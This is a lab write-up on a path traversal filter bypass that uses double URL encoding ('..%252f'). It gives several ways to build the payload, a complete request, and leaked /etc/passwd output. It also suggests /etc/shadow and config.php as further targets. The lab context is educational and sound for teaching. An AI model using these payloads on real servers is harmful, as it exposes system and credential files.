# Path Traversal: Double URL Encoding Bypass

**Lab:** Retrieve `/etc/passwd` using double URL encoding  
**Challenge:** Filter blocks `../` BEFORE decoding

---

## Vulnerability

**Type:** Path Traversal  
**Filter:** Checks for `../` before URL decoding  
**Bypass:** Double encode the slash

---

## The Attack

### Why Normal Traversal Fails

```
Input:    ../../../../etc/passwd
Filter:   Detects "../" → BLOCKED ❌
```

### The Bypass: Double Encode

```
Payload:  ..%252f..%252f..%252f..%252fetc%252fpasswd

Why it works:
Filter sees:  ..%252f (NOT "../") → PASS ✅
Decode once:  ..%2f (still not "../")
Decode again: ../ (traversal works!)
```

---

## How It Works

### Application Flow

```
1. Filter checks input → Looks for "../"
   Input: ..%252f
   "../" found? NO → PASS ✅

2. URL decode once
   ..%252f → ..%2f

3. File system decodes again
   ..%2f → ../

4. Path traversal successful!
   ../../../../etc/passwd → /etc/passwd
```

### Visual Breakdown

```
..%252f
    ↓ (filter check)
No "../" detected → PASS
    ↓ (decode once)
..%2f
    ↓ (decode again)
../  ✓
```

---

## How to Encode

### Method 1: Browser Console (Fastest)

**Step-by-Step:**

1. **Open Browser Console** (Press F12 or Ctrl+Shift+J)

2. **Encode the slash twice:**
```javascript
// Encode slash once
encodeURIComponent("/")
// Output: "%2F"

// Encode slash twice (encode the result again)
encodeURIComponent(encodeURIComponent("/"))
// Output: "%252F"
```

3. **Build the full payload:**
```javascript
// For one level of traversal
console.log("..%252f")
// Output: ..%252F

// For full path to /etc/passwd
console.log("..%252f..%252f..%252f..%252fetc%252fpasswd")
// Output: ..%252F..%252F..%252F..%252Fetc%252Fpasswd
```

4. **Copy and paste** into the URL parameter

---

### Method 2: Burp Suite Decoder

**Step-by-Step:**

1. **Open Burp Suite → Go to Decoder tab**

2. **Type the slash character:**
   ```
   /
   ```

3. **First encoding:**
   - Click **"Encode as..."** dropdown
   - Select **"URL"**
   - Result: `%2F`

4. **Second encoding:**
   - Keep the output `%2F` selected
   - Click **"Encode as..."** again
   - Select **"URL"** again
   - Result: `%252F`

5. **Build your payload manually:**
   ```
   ..%252F..%252F..%252F..%252Fetc%252Fpasswd
   ```

6. **Copy to Repeater or browser**

---

### Method 3: Python Script

**Step-by-Step:**

1. **Open Python terminal or save as script:**

```python
import urllib.parse

# Encode slash once
slash_once = urllib.parse.quote("/")
print(f"Single encode: {slash_once}")
# Output: %2F

# Encode slash twice
slash_twice = urllib.parse.quote(slash_once)
print(f"Double encode: {slash_twice}")
# Output: %252F

# Build full payload
payload = "..%252f" * 4 + "etc%252fpasswd"
print(f"Full payload: {payload}")
# Output: ..%252f..%252f..%252f..%252fetc%252fpasswd
```

2. **Copy the output**

---

### Method 4: Manual Encoding

**Understanding the encoding:**

```
Step 1: Start with /
Step 2: First URL encode
        / (hex: 2F) → %2F

Step 3: Second URL encode (encode the %)
        % (hex: 25) → %25
        %2F → %252F

Full breakdown:
/  →  %2F  →  %252F
      ↑         ↑
   1st encode  2nd encode (% becomes %25)
```

**Build manually:**
```
.. + %252F = ..%252F  (one level)
.. + %252F + .. + %252F + .. + %252F + .. + %252F = ../../../../
Add: etc%252Fpasswd

Final: ..%252F..%252F..%252F..%252Fetc%252Fpasswd
```

---

### Method 5: Online URL Encoder

**Step-by-Step:**

1. **Go to:** https://www.urlencoder.org/

2. **First encoding:**
   - Type: `/`
   - Click **"Encode"**
   - Result: `%2F`

3. **Second encoding:**
   - Copy the result `%2F`
   - Paste it back into the input
   - Click **"Encode"** again
   - Result: `%252F`

4. **Build your payload:**
   ```
   ..%252F..%252F..%252F..%252Fetc%252Fpasswd
   ```

---

### Quick Encoding Reference

**What you need to encode:**

| Character | First Encode | Second Encode | Use in Payload |
|-----------|--------------|---------------|----------------|
| `/` | `%2F` | `%252F` | `..%252F` |
| `.` (optional) | `%2E` | `%252E` | Can leave as `.` or encode |

**Two encoding styles:**

```
Mixed (recommended):
..%252F..%252F..%252Fetc%252Fpasswd
(dots are literal, slashes double-encoded)

Full encoding:
%252E%252E%252F%252E%252E%252Fetc%252Fpasswd
(everything double-encoded)

Both work! Mixed is shorter.
```

---

## Exploitation Steps

### Step 1: Find the Parameter

```
URL: /image?filename=product.jpg
```

### Step 2: Build the Payload

```
Payload: ..%252f..%252f..%252f..%252fetc%252fpasswd
```

### Step 3: Execute

**Complete URL:**
```
/image?filename=..%252f..%252f..%252f..%252fetc%252fpasswd
```

**Or use Burp Repeater:**
```http
GET /image?filename=..%252f..%252f..%252f..%252fetc%252fpasswd HTTP/1.1
Host: lab.com
```

### Step 4: Success

```
Response:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...

✓ Lab Solved
```

---

## Attack Flow

```
Original URL:
/image?filename=product.jpg
         ↓
Modified URL:
/image?filename=..%252f..%252f..%252f..%252fetc%252fpasswd
         ↓
Filter Check: No "../" found → Pass
         ↓
Decode: ..%2f..%2f..%2f..%2fetc%2fpasswd
         ↓
File System: ../../../../etc/passwd
         ↓
Result: /etc/passwd retrieved ✓
```

---

## Why This Works

### The Key Concept

```
Filter looks for: "../"
We provide:       ..%252f

After 1st decode: ..%2f  (still not "../")
After 2nd decode: ../    (now it's traversal!)
```

### Encoding Breakdown

```
Character:  /
1st encode: %2f
2nd encode: %252f (the % becomes %25)

Build payload:
.. + %252f = ..%252f
Repeat 4 times + etc%252fpasswd
```

---

## Quick Reference

| Original | Single Encode | Double Encode |
|----------|---------------|---------------|
| `/` | `%2f` | `%252f` |
| `../` | `..%2f` | `..%252f` |

**Final Payload:**
```
..%252f..%252f..%252f..%252fetc%252fpasswd
```

**Other Targets:**
```
..%252f..%252f..%252fetc%252fshadow
..%252f..%252fvar%252fwww%252fhtml%252fconfig.php
```

---

## Common Mistakes

❌ **Single encoding:**
```
..%2f..%2fetc/passwd  (filter may still catch this)
```

❌ **Not encoding the slash:**
```
../../../../etc/passwd  (blocked immediately)
```

✅ **Correct - double encoded slash:**
```
..%252f..%252f..%252f..%252fetc%252fpasswd
```

---

## Lab Solution

**Payload:**
```
..%252f..%252f..%252f..%252fetc%252fpasswd
```

**Result:** ✓ `/etc/passwd` retrieved  
**Status:** LAB SOLVED

---

## Key Takeaway

When the filter runs **BEFORE** URL decoding:
- Normal `../` → Blocked
- Single encode `..%2f` → May be blocked
- **Double encode `..%252f`** → Bypasses filter ✓

The double-encoded slash prevents the filter from detecting the complete `../` pattern!